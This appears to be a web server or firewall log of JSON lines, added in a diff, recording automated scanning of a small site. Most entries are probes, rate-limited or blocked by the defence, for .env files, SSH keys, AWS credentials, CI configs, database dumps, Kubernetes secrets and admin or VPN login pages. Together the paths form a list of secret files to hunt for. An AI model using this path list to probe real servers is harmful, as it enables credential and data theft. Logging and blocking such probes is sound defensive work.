+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/objects/?module=saverestore", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/application/login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/pluginManager/api/json?depth=1", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/System/info/Public", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/images/logo.gif", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/login/login.cgi", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/health", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/giris", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/SV-Control/index.html", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/psp/ps/?cmd=login", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/assets/img/favicon.ico", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/themes/admin/default/build/assets/favicon-19fbef86.svg", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/dashboard/favicon.ico", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:31", "ip": "172.232.253.221", "path": "/kubepi/fav.png", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:32", "ip": "172.232.253.221", "path": "/public/static/favicon.png", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:32", "ip": "172.232.253.221", "path": "/assets/favicon.png", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:32", "ip": "172.232.253.221", "path": "/favicon.png", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:32", "ip": "172.232.253.221", "path": "/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:32", "ip": "172.232.253.221", "path": "/", "action": "rate_limited"}
+{"time": "2026-08-09 17:32:34", "ip": "172.232.253.221", "path": "/sdk", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-09 17:32:34", "ip": "172.232.253.221", "path": "/health", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-09 17:32:34", "ip": "172.232.253.221", "path": "/api/v2/about", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-09 17:32:39", "ip": "172.232.253.221", "path": "/dniapi/userInfos", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-09 17:32:39", "ip": "172.232.253.221", "path": "/dana-na/nc/nc_gina_ver.txt", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-09 17:32:39", "ip": "172.232.253.221", "path": "/user", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-09 17:32:44", "ip": "172.232.253.221", "path": "/+CSCOE+/logon.html", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-09 17:32:44", "ip": "172.232.253.221", "path": "/human.aspx?arg12=infotech", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-09 17:32:44", "ip": "172.232.253.221", "path": "/webui", "action": "backend_error", "error": "[Errno 32] Broken pipe"}
+{"time": "2026-08-09 17:48:07", "ip": "52.167.144.18", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-3.jpg", "action": "allowed"}
+{"time": "2026-08-09 18:07:08", "ip": "130.12.180.107", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 19:00:12", "ip": "172.213.225.209", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-09 19:04:10", "ip": "172.213.225.209", "path": "/wp-content/plugins/hellopress/wp_filemanager.php", "action": "allowed"}
+{"time": "2026-08-09 19:05:19", "ip": "23.229.125.62", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 19:05:20", "ip": "23.229.125.62", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-09 19:34:36", "ip": "52.167.144.204", "path": "/Bootstrap-5-portfolio-template/images/portfolio/portfolio-5.jpg", "action": "allowed"}
+{"time": "2026-08-09 20:04:40", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 20:06:13", "ip": "18.116.101.220", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 20:24:42", "ip": "146.190.145.217", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 20:24:59", "ip": "146.190.145.217", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-09 20:53:18", "ip": "147.185.132.177", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 20:59:10", "ip": "45.61.178.67", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 20:59:10", "ip": "45.61.178.67", "path": "/api/v1/licensing/about", "action": "allowed"}
+{"time": "2026-08-09 21:15:44", "ip": "185.72.240.57", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 21:15:45", "ip": "185.72.240.57", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-09 21:46:36", "ip": "77.83.39.94", "path": "/.git/config", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-09 23:05:29", "ip": "135.233.112.109", "path": "/portal/redlion", "action": "allowed"}
+{"time": "2026-08-09 23:08:31", "ip": "168.144.37.27", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 23:17:16", "ip": "91.231.89.186", "path": "/", "action": "allowed"}
+{"time": "2026-08-09 23:20:20", "ip": "91.231.89.183", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-09 23:46:39", "ip": "66.249.69.38", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-10 00:13:06", "ip": "64.137.37.15", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-10 00:13:08", "ip": "64.137.37.15", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-10 00:18:20", "ip": "198.235.24.139", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 01:29:51", "ip": "40.77.167.74", "path": "/Bootstrap-5-portfolio-template/images/testimonials/client-4.jpg", "action": "allowed"}
+{"time": "2026-08-10 01:39:54", "ip": "147.185.132.30", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 02:09:41", "ip": "18.97.26.53", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 02:27:20", "ip": "154.6.11.162", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-10 02:27:21", "ip": "154.6.11.162", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-10 02:28:44", "ip": "20.29.22.156", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 03:14:27", "ip": "167.94.146.50", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 03:14:33", "ip": "167.94.146.50", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-10 03:14:42", "ip": "167.94.146.50", "path": "/robots.txt", "action": "allowed"}
+{"time": "2026-08-10 03:14:47", "ip": "167.94.146.50", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-10 03:14:54", "ip": "167.94.146.50", "path": "/tj6pwarna", "action": "allowed"}
+{"time": "2026-08-10 03:15:00", "ip": "167.94.146.50", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-10 03:19:55", "ip": "107.150.98.59", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 03:20:03", "ip": "107.150.98.59", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-10 03:21:27", "ip": "34.38.47.118", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 03:22:14", "ip": "107.150.98.59", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-10 03:31:45", "ip": "93.174.93.12", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 03:56:29", "ip": "85.217.149.26", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 04:45:35", "ip": "185.101.252.230", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-10 04:45:36", "ip": "185.101.252.230", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-10 05:02:31", "ip": "40.77.167.77", "path": "/Bootstrap-5-portfolio-template/images/testimonials/client-3.jpg", "action": "allowed"}
+{"time": "2026-08-10 05:10:55", "ip": "169.58.152.72", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-10 05:15:44", "ip": "103.74.20.67", "path": "/boaform/admin/formLogin?username=ec8&psd=ec8", "action": "allowed"}
+{"time": "2026-08-10 05:43:22", "ip": "20.65.195.37", "path": "/actuator/health", "action": "allowed"}
+{"time": "2026-08-10 05:54:11", "ip": "65.49.1.192", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 05:58:25", "ip": "65.49.1.199", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-10 05:59:51", "ip": "65.49.1.192", "path": "/geoserver/web/", "action": "allowed"}
+{"time": "2026-08-10 06:47:37", "ip": "142.147.128.20", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-10 06:47:39", "ip": "142.147.128.20", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-10 07:11:18", "ip": "8.216.4.187", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 07:11:18", "ip": "8.216.4.187", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 08:55:32", "ip": "139.170.72.104", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 08:55:35", "ip": "221.13.93.243", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 08:55:48", "ip": "123.178.210.247", "path": "/", "action": "allowed"}
+{"time": "2026-08-10 08:55:54", "ip": "112.94.253.180", "path": "/favicon.ico", "action": "allowed"}
+{"time": "2026-08-10 09:43:57", "ip": "64.137.96.57", "path": "/.env", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-10 09:43:58", "ip": "64.137.96.57", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-10 09:45:14", "ip": "15.237.190.156", "path": "/", "action": "backend_error", "error": "HTTP Error 405: METHOD NOT ALLOWED"}
+{"time": "2026-08-10 09:45:20", "ip": "15.237.190.156", "path": "/public/", "action": "allowed"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/index.php", "action": "allowed"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.local", "action": "attack_blocked", "attempt": 1}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env", "action": "attack_blocked", "attempt": 2}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.old", "action": "attack_blocked", "attempt": 3}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.backup", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.bak", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.save", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.development", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.dev", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.development.local", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.staging", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.stage", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:25", "ip": "15.237.190.156", "path": "/.env.test", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.testing", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.prod", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.production", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.preprod", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.live", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.ci", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.dist", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.default", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.example", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.sample", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/.env.template", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/admin/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/administrator/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/adminer/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/api/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/app/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/backend/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/blog/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/bootstrap/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/build/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/config/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/core/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/database/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:26", "ip": "15.237.190.156", "path": "/dev/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/laravel/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/env/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/old/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/prod/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/public/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/src/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/staging/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/test/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/tests/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/vendor/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/crm/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.php", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.json", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.yaml", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.yml", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.bak~", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env~", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.old~", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.swp", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.production.local", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.staging.local", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/config/env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/.env.local.php", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/settings/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:27", "ip": "15.237.190.156", "path": "/private/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/secret/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/.docker/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/docker/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/.github/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/v1/models", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/api/v1/models", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/kube-system/secrets", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/v1/chat/completions", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/api/v1/namespaces/default/secrets", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/api/v1/namespaces/kube-system/configmaps", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/docker-compose.yml", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/docker-compose.yaml", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/kubesec.yml", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/.gitlab-ci.yml", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/.github/workflows/main.yml", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/Jenkinsfile", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/app/config/parameters.yml", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/.s3cfg", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/.npmrc", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/.ssh/id_rsa", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/.vscode/sftp.json", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/config/master.key", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/storage/logs/laravel.log", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/wp-content/debug.log", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/error_log", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/backup.sql", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/db.sql", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:28", "ip": "15.237.190.156", "path": "/database.sql", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/dump.sql", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/db.sqlite3", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/graphql", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/graphiql", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/api/graphql", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/v1/graphql", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/swagger.json", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/api-docs", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/v3/api-docs", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/v2/api-docs", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/openapi.json", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/swagger-ui.html", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/v2/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/api/v1/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/.aws/credentials", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/backend/api/.env", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/root/.aws/credentials", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 09:45:29", "ip": "15.237.190.156", "path": "/home/.aws/credentials", "action": "banned_ip_blocked"}
+{"time": "2026-08-10 11:37:27", "ip": "20.186.232.154", "path": "/developmentserver/metadatauploader", "action": "allowed"}
